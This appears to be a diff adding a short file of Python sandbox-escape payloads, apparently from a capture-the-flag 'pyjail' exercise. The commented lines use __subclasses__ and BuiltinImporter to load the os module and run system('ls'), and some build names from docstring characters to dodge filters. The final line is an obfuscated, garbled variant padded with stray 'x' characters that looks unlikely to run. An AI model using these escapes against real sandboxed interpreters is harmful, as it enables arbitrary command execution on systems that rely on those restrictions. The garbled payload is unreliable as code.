@@ -1,0 +1,9 @@
+# >>> [str(t) for t in ().__class__.__bases__[0].__subclasses__()].index("<class '_frozen_importlib.BuiltinImporter'>")
+# (()).x_x_xcxlxaxsxsx_x_x.x_x_xbxaxsxexsx_x_[[101]].x_x_xsxuxbxcxlxaxsxsxexsx_x_x(())[18141]((1)).xlxoxaxdx_xmxoxdxuxlxex(((1)).x_x_xdxoxcx_x_x[18141]-+1(()).x_x_xdxoxcx_x_x[1111181](+((()).x_x_xdxoxcx_x_)[11151],)).xrxuxnx(((1)).x_x_xdxoxcx_x_([101])),
+# ( ) . _ _ c l a s s _ _ . _ _ b a s e s _ _ [ 0 ] . _ _ s u b c l a s s e s _ _ ( ) [ 8 4 ] ( ) . l o a d _ m o d u l e ( ( ) . _ _ d o c _ _ [ 8 4 ] + ( ) . _ _ d o c _ _ [ 1 1 8 ] + ( ) . _ _ d o c _ _ [ 1 5 ] ) . r u n ( ( ) . _ _ d o c _ _ [ 0 ] ) 
+# ().__class__.__bases__[0].__subclasses__()[84]().load_module(().__doc__[84]+().__doc__[118]+().__doc__[15]).run(().__doc__[0])
+
+# [t for t in ().__class__.__bases__[0].__subclasses__() if 'BuiltinImporter' in t.__name__][0]().load_module('os').system('ls')
+# [t for t in ().__class__.__bases__[0].__subclasses__() if 'BuiltinImporter' in t.__name__][0]().load_module('os').system('ls')
+
+(()).x_x_xcxlxaxsxsx_x_x.x_x_xbxaxsxexsx_x_[[101]].x_x_xsxuxbxcxlxaxsxsxexsx_x_x(())[18141]((1)).xlxoxaxdx_xmxoxdxuxl(e((((1)).x_x_xdxoxcx_x_([13141]).x_x_xaxdxdx_x_((1(()).x_x_xdxoxcx_x_x[11191]))))).xsxyxsxtxexmx((())).x_x_xdxoxcx_x_([11191]).x_x_xaxd(d(_(_((((2)).x_x_xdxoxcx_x_x[15161])))))
